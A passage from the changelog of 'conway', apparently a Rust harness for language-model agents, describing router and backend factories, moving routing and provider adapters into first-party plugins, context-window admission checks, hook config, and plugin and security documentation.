  process spawn, no event firing exists anywhere in the tree yet -- a rule
  written today parses, validates, and then does nothing, which is stated
  at every declaration site (`HooksConfig`, `HookEntry`, and the `hooks`
  field on `ConwayConfig`), not only here. The default rule list is empty,
  so an operator who never writes `hooks` sees no behavior change.
  `enabled` defaulting to `true` does not repeat the `probe_enabled`
  precedent of config that does nothing: it only has any effect on a rule the operator
  already hand-wrote, not on every config by default. Two later, separate wire dispatch: (the script
  runner that spawns `command` when `event` fires) and (`pre_tool_use` enforcement). Docs updated to
  match: `docs/plugins/hooks.md` point 13's status row and its fail-closed
  summary table row, and `docs/plugins/scripts.md`'s worked JSON example,
  which previously sketched a different, now-superseded shape
  (`{"hooks":{"<event>":[{"match","run"}]}}` — nested per event, a single
  shell string) corrected to the shipped one
  (`{"hooks":{"rules":[{"id","event","command",...}]}}` — a flat, id'd rule
  list, an argv vector). (`crates/conway/src/config/schema.rs`,
  `crates/conway/src/config/merge.rs`, `crates/conway/tests/config_validation.rs`,
  `crates/conway/tests/fixtures/config/hooks_*.json`, `docs/plugins/hooks.md`,
  `docs/plugins/scripts.md`)

- **`ArtifactWriteHandle::noop(agent_id)`: a `ContextHookCtx` fixture no
  longer requires hand-rolling an `ArtifactWriter`**. `ContextHookCtx::artifacts` became a required
  field when the real containment-checked writer landed (`c430ca9`), which
  meant every construction site — including a unit test for a hook that
  never writes a file — had to supply *some* `Arc<dyn ArtifactWriter>`.
  `conway-core`'s own tests solved this with a private `NoopArtifactWriter`;
  a third party got no equivalent. `ArtifactWriteHandle::noop`
  wraps the same no-op shape (performs no I/O, returns `name` unchanged) as
  a constructor on the type the facade already re-exports, so no new name
  was added to `conway::plugin`'s curated surface. Not gated behind
  `feature = "fakes"`: that feature is not forwarded to `conway`'s own
  dependents, so gating it there would have reproduced the exact
  reachability gap this closes. It is a TEST-FIXTURE CONSTRUCTOR and
  explicitly NOT a production fallback in the sense `MinimalRouter`/
  `AlwaysClosedHealthRegistry` are: those compute a real, if degenerate,
  answer that real callers receive, whereas this backs no production call
  path at all (`conway-runtime`'s `agent_loop` always supplies the real
  `AgentArtifactWriter`). It is unconditional for the narrow reachability
  reason above, not as a general licence — see
  `crates/conway-core/src/ports/mod.rs`'s module doc, which separates the
  two kinds. `docs/plugins/authoring.md`'s ten-minute walkthrough
  (step 3) now uses it in place of the fifteen-line hand-rolled double, and
  `.design/context-hook-noop-writer-compile-evidence.md` records both forms
  compiled and run from a facade-only scratch crate, with the before/after
  line count. (`crates/conway-core/src/ports/artifact.rs`,
  `crates/conway-core/src/ports/mod.rs`, `crates/conway-core/src/ports/plugin.rs`,
  `docs/plugins/authoring.md`)

- **A router can now be named and installed the same way a plugin is:
  `RouterFactory`, `ConwayBuilder::with_router_factory`, and a
  `plugins.install` router arm** (,
  settled). `conway_core::ports::
  routing::RouterFactory` carries a router *kind*'s identity (`id`) up
  front and defers actual construction to a deferred, fallible `build`
  step — necessary because `plugins.install` is read long before the
  backends and capability picture a real router needs even exist.
  `RouterFactory::build` receives a `RouterBuildContext` (the resolved
  `RoutingConfig`, `HeadroomPolicy`, and every already-constructed
  backend) and returns a `RouterBundle` (the constructed `Router`, the
  `HealthRegistry` it shares breaker state with, and optionally a matching
  `RoutingExplainer`), or an existing `conway_core::error::ConwayError` on
  failure — no new crate-level error enum. `Router` itself gains no `id()`
  method: router *selection* (naming a kind) must precede router
  *construction* (a fallible step needing backends), so the two stay on
  separate traits, and none of this workspace's 31 `.with_router(..)` call
  sites needed to change.
  `ConwayBuilder::with_router_factory(Arc<dyn RouterFactory>)` registers
  one; `ConwayBuilder::with_router` is unchanged byte-for-byte and still
  wins unconditionally over a registered factory (which is then never even
  invoked). Absent both, `build()` still compiles its own
  `DeclarativeRouter`, exactly as before. `crates/conway-cli/src/
  first_party_plugins.rs` gains a `router_bundle()` beside its existing
  `bundle()`, resolved against `plugins.install` in the same pass —
  empty today (no first-party router crate has landed yet), which the
  unknown-id error now discloses by listing linked router factory ids
  alongside linked plugin ids. See
  [`docs/embedding.md`](docs/embedding.md#installing-a-router-routerfactory-and-the-pluginsinstall-router-arm)
  and [`docs/routing.md`](docs/routing.md#installing-a-different-router).
  (`crates/conway-core/src/ports/routing.rs`, `crates/conway-core/src/ports/mod.rs`,
  `crates/conway-routing/src/explain.rs`, `crates/conway/src/lib.rs`,
  `crates/conway/src/builder.rs`, `crates/conway/src/conway.rs`,
  `crates/conway/tests/router_factory.rs`,
  `crates/conway-cli/src/first_party_plugins.rs`,
  `crates/conway-cli/tests/first_party_plugins.rs`)

- **The routing engine moves from something conway is built with to
  something you install: `conway-routing` is now `conway-plugin-routing`, a
  first-party plugin, and `conway` links it no longer** (, closing this charter). The router
  `RouterFactory` port (immediately above) gains its first real occupant:
  `conway-plugin-routing::RoutingRouterFactory`, published id
  `ROUTER_ID = "conway.routing"`, installed via `plugins.install` (the
  SAME mechanism `crates/conway-cli/src/first_party_plugins.rs`'s
  `router_bundle` already resolved for an empty bundle) or directly via
  `ConwayBuilder::with_router_factory`. **`crates/conway/src/builder.rs`'s
  `build()` no longer compiles a `DeclarativeRouter` by default**: absent an
  injected router or a registered/installed router factory, `build()` now
  falls through to `conway_core::routing::MinimalRouter` — an honest,
  config-only resolver walking `roles.<alias>.chain` in order with no
  capability filtering, no health filtering, and no circuit breaking — and
  the default `HealthRegistry` becomes `conway_core::routing::
  AlwaysClosedHealthRegistry` (no real breaker state) for the same reason:
  `conway` no longer links a `BreakerRegistry` implementation at all. Every
  capability this crate carried travels with it UNCHANGED: `DeclarativeRouter`,
  `BreakerRegistry`/`Clock`/`SystemClock`/`TestClock` (`test-clock` feature),
  `RoutingExplain`, `satisfies`/`strictest`, `config::validate`/`ConfigIssue`/
  `ConfigIssueKind`, and the still-unwired `HealthProber` (still owns its wire-or-retire decision).
  `RouterBuildContext` gains a `capability_index: conway_core::ports::
  CapabilityIndex` field (the SAME index `ConwayBuilder::build` itself
  computes from `.conway/models.json`, optionally probe-overlaid) so a
  router factory does not have to — and structurally cannot correctly —
  reconstruct which `(backend, model)` pairs are declared routable at all
  from `ctx.backends` alone; `CapabilityIndex`/`CapabilityIndexBuilder` join
  the facade's root re-export list for the same reason `RoutingConfig`/
  `HeadroomPolicy` already had to (a `RouterBuildContext` field type must be
  nameable by a crate depending only on `conway`). **Breaking for any code
  outside this workspace naming `conway_routing` directly**: the crate no
  longer exists under that name; depend on `conway-plugin-routing` instead
  (identical public API, `RoutingRouterFactory`/`ROUTER_ID` added). An
  embedder that relied on `ConwayBuilder::build()`'s PRIOR default
  (capability/health filtering with no plugin installed and no
  `with_router`/`with_router_factory` call) must now call
  `.with_router_factory(Arc::new(conway_plugin_routing::RoutingRouterFactory))`
  explicitly to keep that behavior — this is the intended, disclosed
  behavior change this item exists to make, not an oversight. See
  [`docs/routing.md`](docs/routing.md#installing-a-different-router) for
  what changes (and does not) between the absent and installed
  configurations, and the philosophy debt ledger's (renumbered) entry 4,
  now cleared (that ledger was retired to the board on 2026-08-13; see
  `CONTRIBUTING.md` §2).
  (`crates/conway-plugin-routing/` (renamed from `crates/conway-routing/`,
  `git mv`, history preserved; `src/factory.rs` new),
  `crates/conway-core/src/ports/routing.rs`, `crates/conway/src/lib.rs`,
  `crates/conway/src/builder.rs`, `crates/conway/Cargo.toml`,
  `crates/conway/tests/router_plugin_configurations.rs` (new),
  `crates/conway/tests/context_probe_overlay_seam.rs`,
  `crates/conway/tests/role_capability_floor_seam.rs`,
  `crates/conway-cli/src/main.rs`, `crates/conway-cli/src/
  first_party_plugins.rs`, `crates/conway-cli/Cargo.toml`,
  `crates/conway-cli/tests/oneshot.rs`,
  `crates/conway-cli/tests/first_party_plugins.rs`)

- **`Backend` gains an `admit` method: whether a request fits is now
  answerable by the thing talking to the endpoint** . Only a backend knows its model's real window,
  how its provider tokenizes, and what a refusal looks like when it
  arrives, so `Backend::admit(&self, req: &GenerateRequest, headroom_tokens:
  u32) -> Result<Admission, BackendError>` answers with the numbers behind
  the verdict — `est_tokens`, `headroom_tokens`, `max_context_tokens` — on
  both `Ok` and the new `BackendError::ContextTooLarge` (which additionally
  names `required_tokens` and `shortfall_tokens`), never a bare boolean.
  `AnthropicBackend` and `OpenAiCompatBackend` each estimate `est_tokens`
  from their OWN wire-format request body (Anthropic's Messages envelope
  vs. an OpenAI-compatible chat-completions body genuinely serialize to
  different byte counts for identical content), entirely locally — no
  network round trip, not even Anthropic's own `/v1/messages/count_tokens`
  endpoint, is ever made on this path. Both dialects call one shared
  helper, `conway_core::ports::check_admission`, for the headroom
  arithmetic and fit comparison (exactly one implementation, not one
  per dialect); `admit` has a dialect-neutral default implementation so
  every other `Backend` in the workspace (every test fake included) keeps
  compiling unchanged. Headroom the *number* is still declarative
  configuration, resolved by whoever calls `admit` — only who *reads* it
  moved. `capability.rs` (`conway-routing`) still performs its own,
  pre-existing headroom check today; consolidating onto this new port
  method, and relocating `capability.rs` itself, is, not this one — `conway-runtime`'s existing
  admission path is unchanged here, and the only `conway-routing` change is
  the classification arm described next.
  **A refusal advances the fallback chain rather than ending the turn.**
  `BackendError::ContextTooLarge` is classified as `RequestIncompatible`,
  exactly like its post-flight twin `ContextOverflow`: the endpoint is
  healthy, so no circuit-breaker observation is recorded, but the chain
  advances because a larger-window candidate further down the operator's
  own configured list may accept the request. Advancing to the next entry
  the operator already declared is not silent escalation — nothing new is
  being tried that the operator didn't already configure.
  This also keeps the routing-side table consistent with
  `BackendError::is_failover_worthy()`; because `BackendError` is
  `#[non_exhaustive]`, a missing arm would have compiled cleanly and read
  as `Fatal`, which is the opposite behaviour.
  (`crates/conway-core/src/ports/backend.rs`, `crates/conway-core/src/error.rs`,
  `crates/conway-backends/src/admission.rs`,
  `crates/conway-backends/src/{anthropic,openai_compat}/mod.rs`,
  `crates/conway-backends/tests/admission.rs`,
  `crates/conway-routing/src/failure.rs`)

- **Two foundation pages for the plugin and hook documentation set:
  [`docs/plugins/concepts.md`](docs/plugins/concepts.md) and
  [`docs/plugins/README.md`](docs/plugins/README.md)**, indexed from `docs/README.md`'s new
  "Extending conway" group. `concepts.md` is the mental model the other
  four pages assume and none of them re-explain: hook-first registration,
  the observer/participant split (an observer's shape *structurally cannot*
  carry a denial; participants compose so registration order is
  unobservable), the value-class boundary — tool **arguments** are never
  rewritten by anything, permission **verdicts** narrow only, and
  **context** may be edited, dropped, replaced, or masked — fork versus
  spawn for inference-evaluated hooks, and trust in one paragraph.

  The value-class table's reasoning is the part that is not guessable, so
  it is stated once, here: rewriting arguments desynchronizes what a human
  authorized from what executes, because the permission cache key digests
  them; verdicts narrow only because an inference-evaluated policy reads
  attacker-influenced text, making it a property of the type rather than a
  config flag; and context is the *permissive* row precisely because a
  plugin that can append to context can already inject arbitrary text —
  the security line was crossed by `append`, not by `replace`. A reader who
  infers "strict everywhere" from the first two rows would get that wrong.

  **Written ahead of the implementation, and labeled as such at every
  claim** (a labeled forward declaration is respectable, an
  unlabeled one is a trap). Most of the hook architecture is not built:
  `Plugin` has no `hooks()` method, no `hook.fork` capability exists, and
  nothing reads a `hooks` block from settings because no such block
  exists. What is real is in-process `Plugin`/`Tool` registration,
  `ContextHook`, `PermissionGate`, and a `TrustStore` that implements one
  kind keyed on absolute path rather than the full `(kind, id, digest)`
  design. Every unbuilt section names its
 .

- **Three documented guarantees had tests that could not have failed if the
  guarantee were deleted**. Not
  missing tests — existing ones whose fixtures left the thing under test at
  its default, so the assertion said nothing.

  **Model-pin inheritance.** A forked child is documented as inheriting its
  parent's system prompt, tools selector, *and* model pin. The first two
  were genuinely tested; the fixture set `model: None`, so nothing could
  tell the pin reaching the routing request from the pin never existing —
  and it decides which model actually serves the child's turn. The new
  guard needed **two** fixes, not one: the def now carries a pin, *and* the
  test runs under a real `MinimalRouter` rather than the `FakeRouter` the
  neighbouring tests use, because that fake ignores `RouteRequest::pin`
  outright and would have kept the assertion vacuous by a second route.

  **Spawn's refusal to inherit.** The one test exercising it started from a
  root with no definition at all, so asserting the child had none could not
  distinguish "spawn correctly declined" from "there was nothing to
  decline". It now spawns from a root running under the *same* restricted
  definition a fork would inherit, and asserts the child is offered the
  full tool registry rather than the def's narrowed set.

  **One kind, many instances.** `with_backend_factory` documents that two
  config entries naming one kind build that factory twice — the single
  material asymmetry against `RouterFactory`, which builds at most once. No
  test built two entries naming one kind. The new one routes a chain
  through both resulting backends, with the first configured to always
  refuse, so only genuinely distinct backends let the turn complete.

  Each was watched to fail against the removed behaviour before being
  accepted. Three existing tests share the changed fixture and were checked
  to still assert what they did before.
  (`crates/conway-runtime/tests/subagent_fork_spawn.rs`,
  `crates/conway/tests/backend_factory.rs`)

- **The security page names backends and routers — the one extension point
  the harness hands a credential to was the one it omitted**. `docs/plugins/trust-and-security.md` is 267
  lines written so an author meets the limits alongside the guarantees, and
  it did not contain the word "backend"; `docs/providers.md`'s authoring
  section did not contain the word "trust". Meanwhile a `BackendFactory`
  installs through the identical pass as a tool `Plugin`, runs with the
  identical unsandboxed privileges, and is **additionally handed the
  operator's resolved `api_key` and `extra` configuration** — which a tool
  `Plugin` has no channel to receive at all, since its `ToolCtx::config` is
  always an empty default. The extension point that asks for nothing was
  warned about; the one the harness gives credentials to was not.

  A `RouterFactory` turns out to sit between the two, and the page now says
  so: it never receives a raw credential, but `RouterBuildContext` carries
  live `Backend` handles it can call — so it can reach a provider using
  that backend's already-resolved credential **without ever holding the
  credential's bytes**. Narrower exposure, not absent.

  `docs/providers.md` gains "What conway cannot enforce", naming the three
  obligations a third-party implementor carries that no test in this tree
  can check for a crate conway does not compile: cache hints must not
  change request bytes, `admit` must call `check_admission` honestly, and
  untrusted input must yield a typed error rather than a panic. For a
  first-party adapter the first of those is a test conway runs; for a third
  party it is a stated contract, and the authoring page is where it is
  discharged. `docs/embedding.md` gains matching pointers, because a
  library embedder calling the builder directly reaches this surface
  without passing through either page.
  ([`docs/plugins/trust-and-security.md`](docs/plugins/trust-and-security.md),
  [`docs/providers.md`](docs/providers.md),
  [`docs/embedding.md`](docs/embedding.md))

- **A third-party provider adapter can now read its own configuration keys —
  `BackendBuildContext` carries `extra`**. `docs/providers.md` told an author their
  custom keys were "captured verbatim and handed to whichever factory built
  that entry's backend". The first half was true; the second was not —
  `BackendEntry::extra` was populated at load time and then discarded,
  because the build context had no field for it and `build_backend_context`
  never read it.

  Fixed by building the mechanism rather than retracting the claim. The
  reason that was the right way round: `BackendEntry` gave up
  `deny_unknown_fields` *specifically* to give third-party kinds somewhere
  to put custom keys, and the cost of that — a misspelled well-known key
  now silently swallowed — was already paid and already pinned by a test.
  With `extra` reaching no factory, the trade was all cost and no benefit.

  Proven where it counts: `crates/conway-thirdparty-backend`, whose
  `[dependencies]` names exactly one workspace crate, reads a custom key and
  **varies its reply by the value**. The assertion is on that reply, not on
  the field being populated — removing the wiring fails both its tests.
  That crate compiling is also the facade-reachability proof: the field's
  value type is `serde_json::Value`, which conway does not re-export, but a
  third party names `serde_json` in their own manifest exactly as they
  already do for `async-trait` and `serde`.

  The two shipped dialects are unaffected — neither reads `extra` — and no
  existing test needed editing.
  (`crates/conway-core/src/ports/backend.rs`, `crates/conway/src/builder.rs`,
  `crates/conway/src/config/schema.rs`,
  `crates/conway-thirdparty-backend/`, `crates/conway/tests/backend_parity.rs`,
  [`docs/providers.md`](docs/providers.md))

- **Provider adapters have a documented authoring path, and three places
  that said otherwise are corrected** (,
  **closing the backends-as-plugins charter**). `docs/providers.md` gains
  "Writing your own adapter": the crate boundary (`conway` alone, no
  internal crate), how a kind id is published and named in
  `backends.<id>.kind`, how an embedder attaches one, and a worked
  example **lifted verbatim** from `crates/conway-thirdparty-backend` —
  the same code `cargo test -p conway-thirdparty-backend` compiles and
  runs, not a fresh retelling. Elisions are named on the page; the
  `models.json` block is disclosed as rendered JSON rather than source.

  **A distinction the correction turns on, and it is narrower than it
  looked.** `docs/embedding.md`'s table and its "Installing a router"
  section appeared to contradict each other. They do not: they answer
  different questions. `Router` is facade-only **installable** — a
  `RouterFactory` compiles clean against `conway` alone — but still not
  facade-only **authorable**, because `impl Router` needs `RouteRequest`,
  `Route`, and `RoutingError`, none of which the facade exports. Both
  established by compiling a scratch crate against each trait rather than
  by reading, with transcripts recorded in
  `.design/router-installation-q2-compile-evidence.md`. So the `Router`
  row stays **No** and the prose now says which question it answers.

  `.design/extension-architecture.md` §13.5 gains a dated status note.
  That section is a non-goals list for the **out-of-process** subprocess
  transport, not for in-process registration through `ConwayBuilder` — and
  both `docs/embedding.md` and the (since-retired) philosophy debt ledger had
  been citing it as though it settled the latter, which is the mis-citation
  that would have made this recur. For the out-of-process transport all six
  exclusions stand as originally reasoned. In-process, `Backend` and
  `Router` each gained a real answer that did not exist when the section
  was written; `SessionStore`, `HealthRegistry`, `SubagentHost`, and
  `EventSink` did not, each verified rather than assumed.
  (`docs/providers.md`, `docs/embedding.md`,
  `.design/extension-architecture.md`,
  `.design/router-installation-q2-compile-evidence.md`)

- **`crates/conway/src/lib.rs`'s `pub mod plugin` doc comment stops citing
  §13.5 as authority over the in-process question, and stops naming
  `Router` alongside ports that are still genuinely closed** (, the third of the three stale declaration
  sites the item above found — this one deferred rather than fixed by that
  item because it needed its own, narrower edit). The comment used to say
  the `SubagentHost`/`EventSink`/`SessionStore`/`Router`/`HealthRegistry`
  surfaces were closed because "§13.5 rejects plugin implementations of
  those with stated reasons," sitting a few dozen lines below the very
  `RouterFactory`/`RouterBuildContext`/`RouterBundle` re-export that
  contradicts the `Router` half of that sentence. `Router` now has its own
  paragraph: authoring a new `impl Router` is still out of reach
  (`RouteRequest`/`Route`/`RoutingError` are not re-exported), but
  installing one is a real, tested, facade-only mechanism this module does
  not carry, and the comment now points at `RouterFactory` and
  `docs/embedding.md` instead of repeating the claim it just disproved.
  `SubagentHost`/`EventSink`/`HealthRegistry` are still closed, but for
  their own actual in-process reason (no `ConwayBuilder::with_*` injects a
  replacement) rather than a citation to a section that never addressed
  in-process registration; `SessionStore` for its own reason
  (`SeqRange`/`StoreError` not re-exported). No behavior changed.
  (`crates/conway/src/lib.rs`)

- **The backend authoring surface now has a stranger proving it works, not
  conway's own test suite vouching for itself**. New workspace member
  `crates/conway-thirdparty-backend`, whose `[dependencies]` names exactly
  one workspace crate — `conway` — and no internal crate, no `fakes`
  feature, nothing a stranger could not enable. It hand-writes a `Backend`
  and a `BackendFactory`, is selected by `kind` from a **real
  `settings.json`** loaded through `conway::config::load`, and installs
  through `ConwayBuilder::with_backend_factory`: the identical public
  channel the shipped adapters now use.

  The crate is a separate workspace member rather than a test file inside
  `crates/conway/tests/` for a reason that is the point of the item: a
  separate manifest **genuinely cannot resolve** `conway_core::anything`,
  where `crates/conway`'s own dev-dependency graph already includes the
  internal crates, so a stray import there would compile and silently
  weaken the proof. Same choice `conway-plugin-skeleton` makes one
  extension point over.

  Demonstrated twice — as a library embedder, and as a genuinely separate
  compiled binary driven through `assert_cmd` — both asserting the
  completed turn's **returned text**, never a factory call count, since an
  invoked factory whose result is discarded produces an identical count to
  one that works. Credential-free and network-free throughout.

  The compile guard is the load-bearing half: removing `ProbeReport` from
  `conway::backend`'s re-export list makes this crate fail with
  `error[E0432]: unresolved import` rather than failing a runtime
  assertion. No asymmetry between the third-party and first-party paths was
  found — the predicted tension (a stranger cannot reach `conway-core`'s
  fakes) resolved to a fully public substitute the facade already provides.
  (`crates/conway-thirdparty-backend/`)

- **Declining a shipped dialect now says so: a `backends.<id>` entry
  naming a declined kind gets a different message from one naming a kind
  conway has never heard of**.
  `plugins.default_backends` already let an operator decline by editing a
  list; what was missing was the consequence. Declining and leaving a stale
  entry behind produced the plain unknown-kind error — telling someone who
  deliberately turned a dialect off that it never existed, which is a worse
  diagnosis than the situation deserves.

  `ConwayBuilder::with_declined_backend_kinds` is **purely diagnostic**: it
  never attaches, blocks, or filters a factory. It tells `build()` which
  kinds this binary links but a caller chose not to install, so the
  existing per-entry resolution failure can pick the accurate message.
  Declining stays a hard `build()`-time error rather than a skip-with-
  warning, because skipping moves the failure from start time to request
  time — and a build that quietly ends up with zero backends is never an
  acceptable thing to fall into.

  Both messages are pinned by a test asserting they differ, exercised from
  the library API and from the **real compiled binary**, on exit code and
  stderr rather than an internal flag. The default is untouched: with
  nothing declined the installed backends are identical, proven by the
  existing suite passing with **no test edited** — 76 added lines, zero
  deleted.
  (`crates/conway/src/builder.rs`,
  `crates/conway-cli/src/first_party_plugins.rs`,
  `crates/conway-cli/tests/decline_backend_kind.rs`,
  [`docs/providers.md`](docs/providers.md))

- **BREAKING: `conway` no longer compiles either provider dialect in —
  `conway-backends` is now `conway-plugin-backends`, a first-party plugin,
  installed by default** (, closing
  the backends-as-plugins charter;).
  `crates/conway/Cargo.toml`'s dependency on the adapter crate is gone, and
  no production resolution path in `conway`'s own `src/` hardcodes either
  dialect — `kind` is matched as data against whichever factories are
  registered. (Both strings do still appear there as the shipped
  *configuration defaults*, `DEFAULT_BACKEND_KIND` and
  `default_backends`, which is what a default-on key requires.)
  `AnthropicBackendFactory` and `OpenAiCompatBackendFactory` (kind ids
  `ANTHROPIC_KIND`/`OPENAI_COMPAT_KIND`, strings unchanged) are the crate's
  two `BackendFactory` implementations, **relocated** from `builder.rs`'s
  own `build_anthropic`/`build_openai_compat` rather than reimplemented.
  The temporary compiled-in fallback the preceding item deliberately left
  behind is deleted: `backends.<id>.kind` now resolves against registered
  factories and nothing else.

  **A backend is the one first-party mechanism that attaches without a
  `plugins.install` entry.** `PluginsConfig` gains `default_backends`
  (defaulting to both dialects), because a backend has no honest degenerate
  fallback the way an absent router has `MinimalRouter` — a missing router
  degrades routing, a missing backend leaves conway unable to reach a model
  at all. `first_party_plugins.rs` gains a third arm and a `wanted_ids`
  helper unioning `install` with `default_backends`.

  **Startup capability probing moved with the adapter.** `BackendFactory`
  gains a default-no-op `probe_capabilities`, implemented only by the
  OpenAI-compatible dialect; leaving it behind would have meant the facade
  still constructing the plugin's probe type, i.e. a facade that secretly
  still links what it claims not to. The RESTRICT eligibility filter —
  never admit a pair `models.json` did not declare — stays in `build()` and
  is applied generically over *every* factory's discovered map, so a
  third-party kind inherits that guarantee rather than reimplementing it.
  `BackendBuildContext` gains `profile_file_paths`: the facade still
  discovers which profile files exist; parsing and merging them is the
  plugin's concern now.

  Both proofs are end to end and credential-free. A new
  `conway-cli` test drives the **real compiled binary** against a loopback
  server with an ordinary settings file and **no `plugins` section at
  all**, asserting a one-shot prompt completes and the reply reaches
  stdout. A new test in the plugin crate's own suite proves the identical
  capability for a **library embedder** calling
  `with_backend_factory` directly, with no CLI involved. Nothing required
  reaching past the public surface — the finding that would have mattered
  most here is that there wasn't one.
  (`crates/conway-plugin-backends/`, `crates/conway-core/src/ports/backend.rs`,
  `crates/conway/src/builder.rs`, `crates/conway/src/config/schema.rs`,
  `crates/conway-cli/src/first_party_plugins.rs`,
  `crates/conway-cli/src/main.rs`, [`docs/providers.md`](docs/providers.md))

- **Removed: `conway-backends`' `anthropic` and `openai-compat` cargo
  features; `reqwest` and `eventsource-stream` are now plain, non-optional
  dependencies** (, under the
  backends-as-plugins charter). The crate had a build-time knob nothing
  ever turned: no CI job and no workspace member has ever built it with
  `--no-default-features` — the CI feature matrix is scoped `-p conway`,
  not `-p conway-backends`, and the sole consumer depends on it with
  default features on, unconditionally.

  Stated precisely, because the honest version is weaker than the
  convenient one: the combination **did** compile. `cargo check -p
  conway-backends --no-default-features` succeeded before the change, with
  one dead-code warning on `admission::estimate_wire_tokens` (its callers
  having been compiled out). So this is not an "it was already broken"
  removal. It is an "it was never verified, and now actively contradicts
  the crate's direction" one: `backends.<id>.kind` became an open name
  resolved against installed factories in the same release, so a build
  that compiles one adapter out could produce a plugin unable to honour a
  `kind` its own configuration names — while CI, gating on that axis, would
  certify the state green. Removing the axis makes "every kind this crate
  can name, this crate can build" true by construction, which is what a
  runtime-open `kind` requires.

  `anthropic`, `capabilities`, `config`, `error`, `http`,
  `model_metadata`, `openai_compat`, `probe`, `profile`, and `tool_calls`
  are all reachable exactly as before, just unconditionally, and the crate
  suite is unchanged at 207 tests across 14 binaries. The module docs no
  longer describe anything as feature-independent or feature-gated, since
  the distinction no longer exists.
  (`crates/conway-backends/Cargo.toml`,
  `crates/conway-backends/src/lib.rs`, `crates/conway-backends/src/http.rs`,
  `crates/conway-backends/src/error.rs`,
  `crates/conway-backends/src/config.rs`,
  `crates/conway-backends/src/anthropic/mod.rs`)

- **BREAKING: `backends.<id>.kind` is an open name rather than a closed
  two-valued enum** . `config::schema::BackendKind` is gone;
  `BackendEntry.kind` is a plain `String`, resolved at `build()` against
  every `BackendFactory` registered through
  `ConwayBuilder::with_backend_factory`, falling back to the two adapters
  this facade still compiles in (`"anthropic"`, `"openai-compat"`) for any
  name they claim. **This is the change that makes the factory port
  reachable from configuration at all** — a matching factory now receives a
  real, per-entry `BackendBuildContext` (`id`, `base_url`, resolved
  `api_key`, `dialect`, `models`) instead of the empty stub the previous
  item disclosed, and is invoked **once per `backends.<id>` entry naming
  its kind** rather than unconditionally once per `build()`. The built-in
  fallback is deliberate and temporary; the relocation item
  removes it.

  A `kind` that neither a registered factory nor the two built-ins claim
  fails `build()` with an error quoting the offending value and listing
  every recognised kind — the same disclosure shape the unknown-plugin-id
  error already uses, because a silently ignored `kind` is exactly the
  silent failure this project forbids.

  **BREAKING for a typo, not for a valid config.** A third-party kind needs
  somewhere to put its own keys, so `BackendEntry` drops
  `deny_unknown_fields` in favour of a flattened `extra` catch-all —
  `serde`'s `flatten` and `deny_unknown_fields` cannot coexist, since one
  needs unrecognised keys to fall through and the other needs them to
  error. The consequence is stated rather than buried: **a misspelled
  well-known key such as `base_ur1` no longer fails to load.** It is
  captured into `extra`, never read, and `base_url` silently keeps its
  default. A test pins that exact behaviour rather than merely asserting
  the file loads. Every existing `"kind": "anthropic"` /
  `"kind": "openai-compat"` config keeps working unchanged.

  The two rejected shapes and why: nesting custom keys under a sub-object
  would put built-in keys at one level and third-party keys at another,
  reintroducing precisely the privileged-built-in asymmetry this work
  exists to remove; moving every kind-specific key including
  `dialect` into the catch-all would be the largest possible break to
  existing config files for no benefit the chosen shape does not already
  give. `merge.rs`'s two backend validations were checked rather than
  assumed and stay in the facade unchanged — neither ever inspected `kind`,
  and credential resolution stays centralised regardless of which kind
  builds the backend.

  **Follow-on, since closed:** `BackendBuildContext` did not expose `extra`
  to a factory, so a third-party kind could not read its own custom keys.
  That gap is closed — see the `extra` entry above.
  (`crates/conway/src/config/schema.rs`, `crates/conway/src/builder.rs`,
  `crates/conway/tests/`, [`docs/providers.md`](docs/providers.md),
  [`docs/embedding.md`](docs/embedding.md))

- **Docs 5/5 — the cookbook:
  [`docs/plugins/cookbook.md`](docs/plugins/cookbook.md)**, completing the plugin documentation set. Five
  worked examples, each labeled implementable-today, partially-implementable,
  or blocked, and **every runnable one compiled and run** against a scratch
  crate depending only on `conway` — 12 tests across five files, all passing.

  These are the architecture's own acceptance tests: if the design makes one
  awkward, the design is wrong, not the example. Both cases named as its
  judges hold. **Spilling bulky tool output to a file** works today — and the
  finding is that it was *never* the design failure it was recorded as:
  `ContextHook::before_request` has had edit/drop/replace authority over any
  segment, including a `Provenance::ToolResult` one. The only
  genuinely missing piece was somewhere confinement-checked to put the bytes,
  closed this release by `ContextHookCtx::artifacts`. **Progressive skill
  disclosure** needed nothing new at all.

  Compaction is the honest counter-case, and the reason a cookbook of only
  what happens to work would be a marketing document. The ephemeral,
  per-request form runs. The *persisted, reversible* form — the one that
  keeps the session log append-only and the masking inspectable — has **no
  producer for `LogRecord::ContextMask` anywhere in the tree**, and no hook
  can reach it. The record type and its reader exist; nothing writes one.
  Named as an open, unfiled gap rather than papered over.

  Also stated exactly: `on_overflow` fires only on `ContextTooLarge` and
  never on a mixed `NoCandidate` rejection. The inference-evaluated
  permission variant and the plugin-declared status line are both
  designed-not-built and cited as such, with the real embedder-level
  `EventSink`/`Event` shape shown as the closest honest analog for the
  latter.
  (`docs/plugins/cookbook.md`, `docs/plugins/README.md`)

- **Docs 4/5 — the authoring guide:
  [`docs/plugins/authoring.md`](docs/plugins/authoring.md),
  [`scripts.md`](docs/plugins/scripts.md), and
  [`inference-hooks.md`](docs/plugins/inference-hooks.md)**. `authoring.md`'s ten-minute walkthrough gets
  an author from an empty crate to a `ContextHook` they can watch transform
  a payload, and **its code was executed verbatim** against a scratch crate
  whose only conway dependency is `conway` itself — the snippets are
  extracted from the page's own markdown, compiled, and run, so what a
  reader copies is literally what was tested.

  Running it is what justified the requirement. The walkthrough did **not**
  compile as first written: it left `ContextHookCtx`'s `artifacts` field as
  a comment (`artifacts: /* see "Artifacts" below */,`), which is
  `error: expected expression, found ','`. Making it work needs about
  fifteen lines of no-op `ArtifactWriter` boilerplate, because that field
  became required in this same release and the facade ships no no-op
  implementation. The page now shows the working form; the underlying
  ergonomic problem is filed as.

  `scripts.md` carries a heavier caveat, stated at the top rather than
  buried: **no script-dispatching plugin exists in the tree**, so it
  documents a designed convention rather than a runnable path — the honest
  shape when six of fourteen extension points are implemented. It still
  states the cost that decides the design (process spawn is roughly
  10-50 ms for a shell script and 200-400 ms for a Python one, per
  invocation, compounding across parallel tool batches) and the rule that a
  script which *dies* must never be read as consent.
  `inference-hooks.md` frames fork-versus-spawn as "judge with full context"
  against "judge in isolation", names the security asymmetry plainly, and
  leads its guidance with when *not* to reach for one: a static rule is
  faster, cheaper, deterministic, and still works when the plugin is dead.
  (`docs/plugins/authoring.md`, `docs/plugins/scripts.md`,
  `docs/plugins/inference-hooks.md`, `docs/plugins/README.md`,
  `docs/plugins/hooks.md`)

- **`BackendFactory` — a provider dialect can be named and constructed as an
  installable component** (, under the
